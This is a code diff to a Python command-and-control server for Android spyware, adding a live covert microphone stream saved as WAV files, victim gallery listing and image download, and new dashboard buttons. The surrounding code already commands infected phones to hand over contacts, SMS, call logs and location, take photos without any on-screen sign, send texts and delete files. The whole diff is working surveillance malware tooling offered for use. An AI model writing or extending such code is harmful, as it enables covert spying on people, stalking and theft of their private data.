@@ -55,6 +55,7 @@ import base64
 import json
 import os
 import re
+import struct
 import sys
 import threading
 import time
@@ -207,6 +208,16 @@ def sanitize(s):
     return re.sub(r"[^A-Za-z0-9._-]+", "_", str(s or ""))[:64]
 
 
+def wav_header(data_len, rate=16000, channels=1, bits=16):
+    """Canonical 44-byte RIFF/WAVE header for a PCM stream."""
+    byte_rate = rate * channels * bits // 8
+    block_align = channels * bits // 8
+    return (b"RIFF" + struct.pack("<I", 36 + data_len) + b"WAVE"
+            + b"fmt " + struct.pack("<IHHIIHH", 16, 1, channels, rate,
+                                    byte_rate, block_align, bits)
+            + b"data" + struct.pack("<I", data_len))
+
+
 def placeholder_count(o):
     """How many binary attachments a socket.io args tree references."""
     if isinstance(o, dict):
@@ -269,6 +280,16 @@ def render_text(name, data):
                                             a.get("versionName") or "?"))
         return "\n".join(lines)
 
+    if name == "x0000getAllImages" and isinstance(data.get("images"), list):
+        lines = ["# Device gallery  (captured %s)" % stamp, ""]
+        for im in data["images"]:
+            lines.append("Name:  %s" % (im.get("imageName") or ""))
+            lines.append("Path:  %s" % (im.get("imagePath") or ""))
+            lines.append("Size:  %s  Date: %s" % (im.get("imageSize") or "?",
+                                                  im.get("imageDate") or "?"))
+            lines.append("-" * 40)
+        return "\n".join(lines)
+
     return None
 
 
@@ -290,6 +311,9 @@ class Device(object):
         self.last_pong = time.monotonic()
         self.bin_buf = []          # incoming binary attachments, in num order
         self.pending_binary = []   # events waiting for their attachments
+        self.last_activity = time.monotonic()   # any HTTP touch (poll/post)
+        self.mic_file = None       # open live-mic stream (.wav) for this device
+        self.mic_data = None       # accumulated PCM payload for the stream
 
 
 class C2Server(object):
@@ -332,8 +356,17 @@ class C2Server(object):
             dev.info["release"] or "?", dev.info["id"] or "?"))
         return "0" + body
 
+    def touch(self, dev):
+        dev.last_activity = time.monotonic()
+
     def poll(self, dev):
+        self.touch(dev)
         with dev.cond:
+            # Hold the long-poll up to 20s. Note: socket.io-client-java 2.0.1
+            # closes the session after an empty poll that was held a short
+            # while (~8s) but tolerates the classic 20s hold, so keep it long.
+            # If a poll ever exceeds the client's 10s read timeout, the app
+            # now reconnects (reconnectionDelayMax=30s) instead of dying.
             deadline = time.monotonic() + 20.0
             while not dev.packets and not dev.closed and time.monotonic() < deadline:
                 dev.cond.wait(0.5)
@@ -453,11 +486,51 @@ class C2Server(object):
             self.emit(dev, "order", [payload])
         return len(targets)
 
+    # -- live mic stream (x0000listenMic) -------------------------------
+    def mic_feed(self, dev, b64chunk):
+        """Append one base64 PCM chunk to the device's stream."""
+        if dev.mic_file is None:
+            d = self.saver.devdir(dev)
+            stamp = time.strftime("%Y%m%d-%H%M%S")
+            dev.mic_file = os.path.join(d, "micstream_%s.wav" % stamp)
+            dev.mic_data = bytearray()
+            with open(dev.mic_file, "wb") as f:      # placeholder header
+                f.write(b"\x00" * 44)
+            log("[*] mic stream started -> %s" % dev.mic_file)
+        try:
+            dev.mic_data += base64.b64decode(b64chunk)
+        except Exception:
+            pass
+
+    def mic_stop(self, dev, reason="stop"):
+        """Finalize the WAV (patch the header) when the stream ends."""
+        if dev.mic_file is None:
+            return
+        data = bytes(dev.mic_data or b"")
+        try:
+            with open(dev.mic_file, "r+b") as f:
+                f.write(wav_header(len(data)))
+                f.write(data)
+            log("[*] mic stream saved %s (%d bytes)  reason=%r" % (
+                dev.mic_file, len(data), reason))
+        except OSError as e:
+            log("! mic stream save failed: %s" % e)
+        dev.mic_file = None
+        dev.mic_data = None
+
     def _on_event(self, dev, name, args):
         if name == "pong":
             log("[<] pong  <- %s   (app-level heartbeat reply)" % dev.eio_sid[:8])
             return
         data = args[0] if len(args) == 1 else args
+        if name == "audioData" and isinstance(data, str):
+            # streaming chunks are too chatty to log per-event; the WAV is
+            # summarized on start/stop instead.
+            self.mic_feed(dev, data)
+            return
+        if name == "audioDataStop":
+            self.mic_stop(dev, data if isinstance(data, str) else "stop")
+            return
         log("[<] %s  <- %s" % (name, dev.eio_sid[:8]))
         with _print_lock:
             print("    %s" % json.dumps(summarize(data), indent=4, default=str),
@@ -474,6 +547,13 @@ class C2Server(object):
                 if dev.closed:
                     continue
                 if dev.eio != 3:                # EIO4: client pings, we pong
+                    # EIO4 sessions are never closed by the client on app kill,
+                    # so reap ones that have gone silent (no HTTP for 2x ping
+                    # timeout) -- otherwise the dashboard lists zombies forever.
+                    if now - dev.last_activity > self.ping_timeout * 2:
+                        log("[!] session silent for %ds, closing %s" % (
+                            int(now - dev.last_activity), dev.eio_sid[:8]))
+                        self.close_device(dev)
                     continue
                 if now - dev.last_ping >= self.ping_interval:
                     dev.last_ping = now
@@ -564,7 +644,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <script>
 let target=""; let since=0;
 const $=id=>document.getElementById(id);
-const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"]];
+const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"],["gallery","img-ls"],["mic-live","mic-live"]];
 function pollDevices(){fetch("/api/devices").then(r=>r.json()).then(d=>{
   $("count").textContent=d.length+" connected";
   $("devs").innerHTML=d.length?"":"<p class='dim'>no devices</p>";
@@ -728,13 +808,14 @@ class Handler(BaseHTTPRequestHandler):
             length = int(self.headers.get("Content-Length") or 0)
         except (TypeError, ValueError):
             length = 0
-        body = self.rfile.read(length).decode("utf-8", "replace")
+        body =        self.rfile.read(length).decode("utf-8", "replace")
         if q.get("b64", ["0"])[0] == "1":
             try:
                 body = base64.b64decode(body).decode("utf-8", "replace")
             except Exception:
                 pass
         log("    POST <- %r (sid %s)" % (body[:160], sid[:8]))
+        self.c2.touch(dev)
         self.c2.post(dev, body)
         return self._send(200, "ok")
 
@@ -770,8 +851,8 @@ and saved under --out as .json + readable .txt):
   lm            location (lat/lng/provider/accuracy)   cn       contacts
   cl            call logs          apps          installed apps
   sms           SMS inbox          ca            camera list
-  sc            screen capture*    cam-on [0|1]  take photo, no UI (0=back 1=front)
-  mc <sec>      record mic <sec>s
+  sc            screen capture*    cam-on [0|1]  take photo, no UI (0=back 1=front)  mc <sec>       record mic <sec>s    mic-live    toggle real-time mic stream
+  img-ls         gallery listing      img-dl <path>  fetch image (saved as .jpg)
   fm-ls <path>  list directory     fm-dl <path>  download file
   sms-send <to> <text>             run-app <pkg>   e.g. com.android.settings
   open-url <url>                   delete <path>    delete on device
@@ -793,6 +874,13 @@ def parse_command(line):
         payload = {"order": "x0000ca", "extra": rest[0] if rest else "1"}
     elif cmd == "mc" and len(rest) == 1 and rest[0].isdigit():
         payload = {"order": "x0000mc", "sec": int(rest[0])}
+    elif cmd == "mic-live":
+        payload = {"order": "x0000listenMic"}
+        warn = "mic-live toggles a real-time mic stream; chunks are saved as a .wav on stop (send again to stop)."
+    elif cmd == "img-ls":
+        payload = {"order": "x0000getAllImages"}
+    elif cmd == "img-dl" and len(rest) == 1:
+        payload = {"order": "x0000getImage", "path": rest[0]}
     elif cmd == "fm-ls" and len(rest) == 1:
         payload = {"order": "x0000fm", "extra": "ls", "path": rest[0]}
     elif cmd == "fm-dl" and len(rest) == 1:
